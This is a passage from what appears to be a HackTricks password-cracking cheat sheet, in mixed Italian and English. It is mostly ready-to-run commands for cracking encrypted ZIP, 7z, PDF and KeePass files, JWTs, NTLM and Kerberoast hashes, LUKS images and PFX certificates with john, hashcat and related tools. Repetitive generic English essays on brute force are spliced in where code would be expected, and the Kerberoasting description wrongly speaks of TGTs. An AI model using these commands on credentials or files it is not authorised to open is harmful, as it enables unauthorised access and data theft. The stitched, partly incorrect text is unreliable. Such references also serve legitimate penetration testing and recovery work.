# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
# With that key you can create a new zip file with the content of encrypted.zip
# but with a different pass that you set (so you can decrypt it)
./bkcrack -C <encrypted.zip> -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd
unzip unlocked.zip #User new_pwd as password
```
### 7z

### 7z
```bash
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```bash
#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john
```
### PDF

#### Brute Force

Brute force attacks consist of systematically checking all possible keys or passwords until the correct one is found. This method is usually used when the password is unknown and there is no other way to obtain it. Brute force attacks can be time-consuming but are often effective.

#### Dictionary Attacks

Dictionary attacks involve using a predefined list of words to try as passwords. These lists can be general or specific to the target, increasing the chances of success. Dictionary attacks are usually faster than brute force attacks because they do not need to generate all possible combinations.

#### Rainbow Tables

Rainbow tables are precomputed tables used to crack password hashes. They are generated in advance and contain the hashes of common passwords. By comparing the hash of the target password with the hashes in the rainbow table, the original password can be retrieved quickly.

#### Hybrid Attacks

Hybrid attacks combine dictionary attacks with brute force attacks. They start by using the dictionary list and then switch to brute force if the password is not found. This method is more efficient than brute force alone and can save time by trying common passwords first.
```bash
apt-get install pdfcrack
pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
#pdf2john didn't work well, john didn't know which hash type was
# To permanently decrypt the pdf
sudo apt-get install qpdf
qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```
### Password Proprietario PDF

Per crackare una password del proprietario di un PDF, controlla qui: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)

### JWT
```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```
### Crack di NTLM
```bash
Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```
### Keepass
```bash
sudo apt-get install -y kpcli #Install keepass tools like keepass2john
keepass2john file.kdbx > hash #The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
### Keberoasting

Keberoasting è una tecnica di attacco che sfrutta debolezze nella gestione delle password degli account di servizio. Gli attaccanti mirano agli account di servizio Kerberos per ottenere i TGT (Ticket Granting Ticket) e successivamente eseguire un attacco di forza bruta per recuperare le password degli account.
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Immagine di Lucks

#### Metodo 1

Installazione: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
```bash
bruteforce-luks -f ./list.txt ./backup.img
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
#### Metodo 2
```bash
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
Un altro tutorial su Luks BF: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)

### Mysql
```bash
#John hash format
<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```
### Chiave privata PGP/GPG
```bash
gpg2john private_pgp.key #This will generate the hash and save it in a file
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```
### Cisco

<figure><img src="../.gitbook/assets/image (660).png" alt=""><figcaption></figcaption></figure>

### Chiave Master DPAPI

Utilizzare [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) e poi john

### Colonna Protetta da Password di Open Office

Se hai un file xlsx con una colonna protetta da una password, puoi rimuoverla:

* **Caricalo su Google Drive** e la password verrà rimossa automaticamente
* Per rimuoverla **manualmente**:
```bash
unzip file.xlsx
grep -R "sheetProtection" ./*
# Find something like: <sheetProtection algorithmName="SHA-512"
hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
# Remove that line and rezip the file
zip -r file.xls .
```
### Certificati PFX
```bash
# From https://github.com/Ridter/p12tool
./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
# From https://github.com/crackpkcs12/crackpkcs12
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
```
<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
Usa [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) per creare facilmente e **automatizzare flussi di lavoro** supportati dagli strumenti della comunità **più avanzati al mondo**.\
Ottieni l'accesso oggi:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Strumenti

**Esempi di hash:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)

### Identificatore di hash
```bash
hash-identifier
> <HASH>
```
### Liste di parole

* **Rockyou**
* [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
* [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
* [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

### **Strumenti di generazione di liste di parole**

* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Generatore avanzato di sequenze di tasti con caratteri di base configurabili, mappatura dei tasti e percorsi.
```bash
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```
### Mutazione di John

Leggi _**/etc/john/john.conf**_ e configurarlo
```bash
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```
### Hashcat

#### Attacchi Hashcat

* **Attacco con lista di parole** (`-a 0`) con regole

**Hashcat** già include una **cartella contenente regole** ma puoi trovare [**altre regole interessanti qui**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
```
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
```
* **Attacco di combinazione di elenchi di parole**

È possibile **combinare 2 elenchi di parole in 1** con hashcat.\
Se l'elenco 1 contenesse la parola **"ciao"** e il secondo contenesse 2 righe con le parole **"mondo"** e **"terra"**. Le parole `ciaomondo` e `ciaoearth` verranno generate.
```bash
# This will combine 2 wordlists
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt

# Same attack as before but adding chars in the newly generated words
# In the previous example this will generate:
## hello-world!
## hello-earth!
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
```
* **Attacco a maschera** (`-a 3`)
```bash
# Mask attack with simple mask
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

hashcat --help #will show the charsets and are as follows
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

# Mask attack declaring custom charset
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
## -1 ?d?s defines a custom charset (digits and specials).
## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.

# Mask attack with variable password length
## Create a file called masks.hcmask with this content:
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
## Use it to crack the password
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
```
* Attacco Wordlist + Maschera (`-a 6`) / Maschera + Wordlist (`-a 7`)
```bash
# Mask numbers will be appended to each word in the wordlist
hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d

# Mask numbers will be prepended to each word in the wordlist
hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
```
#### Modalità di Hashcat
```bash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```
# Brute Forcing Linux Hashes - File /etc/shadow

## Introduction

When attempting to crack Linux password hashes stored in the `/etc/shadow` file, a common approach is to use brute force techniques. This involves systematically trying all possible combinations of characters until the correct password is found.

## Methodology

1. **Obtain the Hash**: First, you need to obtain the hash of the password you want to crack from the `/etc/shadow` file.

2. **Select a Tool**: Choose a suitable password cracking tool such as John the Ripper or Hashcat.

3. **Generate Wordlist**: Create a wordlist containing potential passwords based on common patterns, dictionaries, or rules.

4. **Start Brute Forcing**: Use the selected tool to systematically try each password in the wordlist until a match is found.

5. **Optimize**: Adjust the brute force parameters such as character set, password length, and rules to optimize the cracking process.

6. **Monitor Progress**: Monitor the cracking process to track the number of passwords tried and the estimated time to completion.

7. **Success**: Once the correct password is found, you can use it to gain unauthorized access to the target system.

## Conclusion

Brute forcing Linux password hashes from the `/etc/shadow` file can be a time-consuming process, but with the right tools and techniques, it is possible to crack even complex passwords. It is essential to use this knowledge responsibly and only for authorized security testing purposes.
```
500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```
# Brute Force

## Introduction

Brute force attacks are a common way to crack passwords. They involve trying all possible combinations of characters until the correct one is found. Brute force attacks can be time-consuming but are often effective.

## Tools

There are many tools available for conducting brute force attacks. Some popular ones include:

- **John the Ripper**: A versatile password cracking tool that can perform brute force attacks among other techniques.
- **Hashcat**: A powerful password recovery tool that supports multiple hashing algorithms.
- **Hydra**: A fast and flexible network login cracker.

## Methodology

When conducting a brute force attack on Windows hashes, the following steps are typically followed:

1. **Capture Hash**: Obtain the password hash from the target system.
2. **Wordlist Generation**: Create a wordlist containing possible passwords.
3. **Brute Force Attack**: Use a tool like John the Ripper or Hashcat to perform the brute force attack.
4. **Crack Password**: Once the correct password is found, it can be used to gain unauthorized access to the system.

## Conclusion

Brute force attacks can be a powerful tool for cracking passwords, including Windows hashes. It is important to use them responsibly and ethically, as unauthorized access to systems can have serious consequences.
```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```
## Brute Force

### Description

Brute force attacks are a common way to crack passwords. This method involves trying all possible combinations of characters until the correct password is found. Brute force attacks can be time-consuming but are effective against weak passwords.

### Tools

- **John the Ripper**: A popular password-cracking tool that can perform brute force attacks.
- **Hashcat**: Another powerful tool for password cracking that supports various algorithms and attack types.
- **Hydra**: A fast and flexible password-cracking tool that supports multiple protocols.

### Techniques

1. **Dictionary Attack**: Involves using a list of common passwords or words to crack passwords.
2. **Mask Attack**: Allows you to specify the password format using placeholders for characters.
3. **Hybrid Attack**: Combines dictionary and brute force attacks to crack passwords more efficiently.
4. **Rule-based Attack**: Applies specific rules to password cracking attempts, such as adding numbers or special characters.

### Resources

- [CrackStation](https://crackstation.net/): Online hash cracker that supports various hash algorithms.
- [Hashes.org](https://hashes.org/): Online hash cracking service with a large hash database.
- [SecLists](https://github.com/danielmiessler/SecLists): Collection of security-related lists for password cracking.
```
900 | MD4                                              | Raw Hash
0 | MD5                                              | Raw Hash
5100 | Half MD5                                         | Raw Hash
100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
1400 | SHA-256                                          | Raw Hash
1700 | SHA-512                                          | Raw Hash
```
<details>

<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se desideri vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
Usa [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) per costruire facilmente e **automatizzare flussi di lavoro** supportati dagli strumenti della comunità **più avanzati al mondo**.\
Ottieni l'accesso oggi:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
